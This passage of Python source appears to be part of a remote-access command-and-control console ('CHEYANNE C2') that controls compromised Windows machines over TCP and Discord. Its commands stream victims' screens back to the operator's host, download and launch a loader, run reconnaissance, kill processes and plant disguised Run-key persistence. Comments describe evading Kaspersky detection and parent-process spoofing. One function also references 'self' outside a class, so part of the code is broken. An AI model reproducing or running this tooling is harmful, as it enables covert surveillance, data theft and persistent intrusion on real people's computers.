#hud{{position:fixed;top:8px;left:8px;color:#0f0;font:12px monospace;background:rgba(0,0,0,.7);padding:4px 8px;border-radius:4px;z-index:9}}</style></head>
<body><div id="hud">LIVE</div><img id="s"><script>
var f=0,prev=null;
function grab(){{
  f++;
  fetch('/latest.png',{{cache:'no-store'}}).then(function(r){{
    if(!r.ok)return;
    return r.blob();
  }}).then(function(b){{
    if(!b)return;
    if(prev)URL.revokeObjectURL(prev);
    prev=URL.createObjectURL(b);
    document.getElementById('s').src=prev;
    document.getElementById('hud').textContent='LIVE ['+f+']';
  }}).catch(function(){{}});
}}
grab();
setInterval(grab,{interval*1000});
</script></body></html>"""

                        class _ViewHandler(BaseHTTPRequestHandler):
                            def do_GET(self):
                                if self.path == "/" or self.path.startswith("/index"):
                                    body = LIVE_HTML.encode("utf-8")
                                    self.send_response(200)
                                    self.send_header("Content-Type", "text/html")
                                    self.send_header("Content-Length", str(len(body)))
                                    self.end_headers()
                                    self.wfile.write(body)
                                elif self.path.startswith("/latest.png"):
                                    if os.path.exists(latest_path):
                                        with open(latest_path, "rb") as f:
                                            data = f.read()
                                        self.send_response(200)
                                        self.send_header("Content-Type", "image/png")
                                        self.send_header("Content-Length", str(len(data)))
                                        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
                                        self.send_header("Pragma", "no-cache")
                                        self.send_header("Expires", "0")
                                        self.end_headers()
                                        self.wfile.write(data)
                                    else:
                                        self.send_response(204)
                                        self.end_headers()
                                else:
                                    self.send_response(404)
                                    self.end_headers()
                            def log_message(self, *a):
                                pass

                        view_srv = HTTPServer(("0.0.0.0", view_port), _ViewHandler)
                        view_thread = threading.Thread(target=view_srv.serve_forever, daemon=True)
                        view_thread.start()

                        try:
                            import webbrowser
                            webbrowser.open(f"http://127.0.0.1:{view_port}")
                        except Exception:
                            pass

                        print(f"  {GREEN}[+] Live viewer: http://0.0.0.0:{view_port} — refreshes every {interval}s{RST}")
                        print(f"  {AMBER}[*] Streaming screen from {s.id[:8]}... Ctrl+C to stop{RST}")

                        frame_count = [0]

                        class _ScreenHandler(BaseHTTPRequestHandler):
                            def do_POST(self):
                                length = int(self.headers.get("Content-Length", 0))
                                data = self.rfile.read(length)
                                with open(latest_path, "wb") as f:
                                    f.write(data)
                                self.send_response(200)
                                self.end_headers()
                                self.wfile.write(b"OK")
                                frame_count[0] += 1
                                print(f"  {DIM}  [{frame_count[0]}] {len(data):,} bytes{RST}", end="\r")
                            def log_message(self, *a):
                                pass

                        recv_srv = HTTPServer(("0.0.0.0", recv_port), _ScreenHandler)
                        recv_thread = threading.Thread(target=recv_srv.serve_forever, daemon=True)
                        recv_thread.start()

                        loop_cmd = (
                            f'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
                            f'$p=\'C:\\Users\\Public\\screen.png\'; '
                            f'while($true){{ '
                            f'$b=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
                            f'[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
                            f'$g=[System.Drawing.Graphics]::FromImage($b); '
                            f'$g.CopyFromScreen(0,0,0,0,$b.Size); '
                            f'if(Test-Path $p){{Remove-Item $p -Force}} '
                            f'$b.Save($p,[System.Drawing.Imaging.ImageFormat]::Png); '
                            f'$g.Dispose();$b.Dispose(); '
                            f'$bytes=[System.IO.File]::ReadAllBytes($p); '
                            f'try{{Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
                            f'-Method POST -Body $bytes '
                            f'-ContentType \'application/octet-stream\' -TimeoutSec 5 | Out-Null}}catch{{}} '
                            f'Start-Sleep -Seconds {interval} }}"'
                        )
                        s.sock.sendall((loop_cmd + "\n").encode("utf-8"))

                        try:
                            while True:
                                time.sleep(1)
                        except KeyboardInterrupt:
                            # kill the PowerShell loop on target
                            try:
                                s.sock.sendall(b"\x03")
                                time.sleep(0.5)
                                s.sock.sendall(b"\x03")
                                time.sleep(0.5)
                                s.sock.sendall(b"taskkill /F /IM powershell.exe\n".encode())
                                time.sleep(1.0)
                                # drain any leftover output so cmd.exe is clean
                                s.recv(timeout=1)
                            except Exception:
                                pass
                            print(f"\n  {AMBER}[*] Watch stopped — {frame_count[0]} frames received{RST}")
                        finally:
                            recv_srv.shutdown()
                            view_srv.shutdown()

                elif cmd == "kill":
                    if not args:
                        print(f"  {DIM}  Usage: kill <process_name> [session_id]{RST}")
                    else:
                        proc_name = args[0]
                        sid = args[1] if len(args) > 1 else ""
                        s = self.find_session(sid)
                        if not s:
                            print(f"  {RED}[!] No session available.{RST}")
                        else:
                            kill_cmd = f"taskkill /F /IM {proc_name}"
                            if self.send_to_session(s, kill_cmd):
                                print(f"  {GREEN}[+] Sent via {s.channel}: {kill_cmd}{RST}")
                            else:
                                print(f"  {RED}[!] Send failed{RST}")

                elif cmd == "recon":
                    sid = args[0] if args else ""
                    s = self.find_session(sid)
                    if not s:
                        print(f"  {RED}[!] No session available.{RST}")
                    else:
                        recon_cmd = "systeminfo & ipconfig /all & whoami /all & tasklist /v"
                        print(f"  {AMBER}[*] Running recon on {s.id[:8]} ({s.channel})...{RST}")
                        if self.send_to_session(s, recon_cmd):
                            if s.channel == "discord":
                                print(f"  {DIM}[*] Waiting for response via Discord...{RST}")
                                output = self.poll_discord_output(s.id, timeout=30)
                                if output:
                                    print(output)
                                else:
                                    print(f"  {AMBER}[*] No response — check Discord channel{RST}")
                        else:
                            print(f"  {RED}[!] Send failed{RST}")

                elif cmd == "persist":
                    sid = args[0] if args else ""
                    s = self.find_session(sid)
                    if not s:
                        print(f"  {RED}[!] No session available.{RST}")
                    else:
                        if not self.deployed_this_session:
                            print(f"  {AMBER}[!] Run 'deploy' first to push ghost_loader.exe to target.{RST}")
                        # ghost_loader_v3 = CLEAN vs KAV — persists TCP shell via explorer.exe parent spoof
                        # vader_shell.exe is quarantined — never use it for persistence
                        persist_cmd = (
                            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                            '/v WindowsSecurityHealth /t REG_SZ '
                            '/d "C:\\Users\\Public\\svchost_update.exe" /f & '
                            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                            '/v WindowsSecurityUpdate /t REG_SZ '
                            '/d "C:\\Users\\Public\\ghost_loader.exe" /f'
                        )
                        if self.send_to_session(s, persist_cmd):
                            print(f"  {GREEN}[+] Persistence set via {s.channel}:{RST}")
                            print(f"  {GREEN}    WindowsSecurityHealth  → Discord beacon (svchost_update.exe){RST}")
                            print(f"  {GREEN}    WindowsSecurityUpdate  → TCP shell via ghost_loader_v3 (KAV-clean){RST}")
                            print(f"  {DIM}    Both fire on next login — TCP shell calls back to baked C2 IP{RST}")
                        else:
                            print(f"  {RED}[!] Send failed{RST}")

                else:
                    print(f"  {RED}[!] Unknown: {cmd}. Type 'help'{RST}")

        except KeyboardInterrupt:
            print()

        self.running = False
        if self.listener_sock:
            self.listener_sock.close()
        self.log_event("c2_stop")
        print(f"\n  {MUTED}[*] CHEYANNE C2 shutting down...{RST}")
        print(f"  {MUTED}[*] Log: {self.log_path}{RST}")


def run_tcp_cmd(tcp_cmd_str):
    """Execute a single TCP shortcut command non-interactively, then exit."""
    env_path = None
    for i, arg in enumerate(sys.argv):
        if arg == "--env" and i + 1 < len(sys.argv):
            env_path = sys.argv[i + 1]

    load_env(env_path)

    webhook = os.environ.get("DISCORD_C2_WEBHOOK", "")
    token = os.environ.get("DISCORD_BOT_TOKEN", "")
    channel = os.environ.get("DISCORD_C2_CHANNEL", "")

    c2 = VaderC2(webhook, token, channel, LISTEN_PORT)

    c2.start_listener()
    print(f"  {GREEN}[*] TCP listener active on port {c2.port}{RST}")

    c2.poll_thread = threading.Thread(target=c2.poll_loop, daemon=True)
    c2.poll_thread.start()

    messages = c2.read_channel(limit=20)
    if messages:
        c2.parse_messages(messages)

    time.sleep(2)

    s = c2.find_session("", prompt_if_ambiguous=False)
    if not s:
        print(f"  {RED}[!] No session found (TCP or Discord). Connect first.{RST}")
        c2.running = False
        return

    parts = tcp_cmd_str.strip().split()
    cmd = parts[0].lower()
    args = parts[1:]

    sid = s.id
    print(f"  {GREEN}[+] Using session {sid[:8]} ({s.channel}) for command: {tcp_cmd_str}{RST}")

    try:
        _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        _s.connect(("8.8.8.8", 80))
        my_ip = _s.getsockname()[0]
        _s.close()
    except Exception:
        my_ip = "192.168.1.92"

    if cmd == "deploy":
        self._ensure_file_server(my_ip)
        deploy_cmd = (
            f'taskkill /F /IM ghost_loader.exe 2>nul & '
            f'taskkill /F /IM svchost_update.exe 2>nul & '
            f'powershell -c "'
            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/shell/ghost_loader.exe\' '
            f'-OutFile \'C:\\Users\\Public\\ghost_loader.exe\'; '
            f'Start-Process \'C:\\Users\\Public\\ghost_loader.exe\'"'
        )
        s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
        print(f"  {GREEN}[+] Deploy sent — ghost_loader_v3 (KAV-clean) delivering TCP shell{RST}")

    elif cmd == "screenshot":
        recv_port = 8891
        ts = int(time.time())
        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
        os.makedirs(ss_dir, exist_ok=True)
        out_path = os.path.join(ss_dir, f"radon_{ts}.png")

        received = threading.Event()
        def _recv():
            from http.server import HTTPServer, BaseHTTPRequestHandler
            class H(BaseHTTPRequestHandler):
                def do_POST(self_h):
                    length = int(self_h.headers.get("Content-Length", 0))
                    data = self_h.rfile.read(length)
                    with open(out_path, "wb") as f:
                        f.write(data)
                    self_h.send_response(200)
                    self_h.end_headers()
                    self_h.wfile.write(b"OK")
                    received.set()
                def log_message(self_h, *a):
                    pass
            srv = HTTPServer(("0.0.0.0", recv_port), H)
            srv.timeout = 30
            srv.handle_request()
            srv.server_close()

        threading.Thread(target=_recv, daemon=True).start()
        shot_cmd = (
            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
            '$g.Dispose(); $bmp.Dispose(); '
            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
            '-ContentType \'application/octet-stream\'"'
        )
        s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
        received.wait(timeout=30)
        if received.is_set() and os.path.exists(out_path):
            print(f"  {GREEN}[+] Screenshot saved: {out_path} ({os.path.getsize(out_path):,} bytes){RST}")
        else:
            print(f"  {AMBER}[*] Screenshot command sent — file didn't arrive in 30s{RST}")

    elif cmd == "watch":
        interval = int(args[0]) if args and args[0].isdigit() else 5
        recv_port = 8891
        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
        os.makedirs(ss_dir, exist_ok=True)
        latest_path = os.path.join(ss_dir, "latest.png")

        from http.server import HTTPServer, BaseHTTPRequestHandler
        class SH(BaseHTTPRequestHandler):
            def do_POST(self_h):
                length = int(self_h.headers.get("Content-Length", 0))
                data = self_h.rfile.read(length)
                with open(latest_path, "wb") as f:
                    f.write(data)
                self_h.send_response(200)
                self_h.end_headers()
                self_h.wfile.write(b"OK")
            def log_message(self_h, *a):
                pass

        srv = HTTPServer(("0.0.0.0", recv_port), SH)
        srv.timeout = interval + 10

        shot_cmd = (
            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
            '$g.Dispose(); $bmp.Dispose(); '
            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
            '-ContentType \'application/octet-stream\'"'
        )
        frame = 0
        try:
            while True:
                s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
                srv.handle_request()
                frame += 1
                print(f"  [{frame}] streaming...")
                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"  {AMBER}[*] Watch stopped — {frame} frames{RST}")
        finally:
            srv.server_close()

    elif cmd == "recon":
        recon_cmd = "systeminfo & ipconfig /all & whoami /all & tasklist /v"
        s.sock.sendall((recon_cmd + "\n").encode("utf-8"))
        print(f"  {GREEN}[+] Recon command sent.{RST}")
        time.sleep(10)

    elif cmd == "persist":
        persist_cmd = (
            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WindowsSecurityHealth /t REG_SZ '
            '/d "C:\\Users\\Public\\svchost_update.exe" /f & '
            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WindowsSecurityUpdate /t REG_SZ '
            '/d "C:\\Users\\Public\\vader_shell.exe" /f'
        )
        s.sock.sendall((persist_cmd + "\n").encode("utf-8"))
        print(f"  {GREEN}[+] Persistence set — Discord + TCP shell (C2 baked in){RST}")

    elif cmd == "kill":
        proc = args[0] if args else ""
        if not proc:
            print(f"  {RED}[!] No process name given.{RST}")
        else:
            s.sock.sendall((f"taskkill /F /IM {proc}\n").encode("utf-8"))
            print(f"  {GREEN}[+] Kill command sent: {proc}{RST}")

    else:
        print(f"  {RED}[!] Unknown TCP command: {cmd}{RST}")

    c2.running = False
    if c2.listener_sock:
        c2.listener_sock.close()


def main():
    env_path = None
    port = LISTEN_PORT
    tcp_cmd = None
    for i, arg in enumerate(sys.argv):
        if arg == "--env" and i + 1 < len(sys.argv):
            env_path = sys.argv[i + 1]
        if arg == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
        if arg == "--tcp-cmd" and i + 1 < len(sys.argv):
            tcp_cmd = sys.argv[i + 1]

    if tcp_cmd:
        run_tcp_cmd(tcp_cmd)
        return

    load_env(env_path)

    webhook = os.environ.get("DISCORD_C2_WEBHOOK", "")
    token = os.environ.get("DISCORD_BOT_TOKEN", "")
    channel = os.environ.get("DISCORD_C2_CHANNEL", "")

    c2 = VaderC2(webhook, token, channel, port)
    c2.run()


if __name__ == "__main__":
    main()
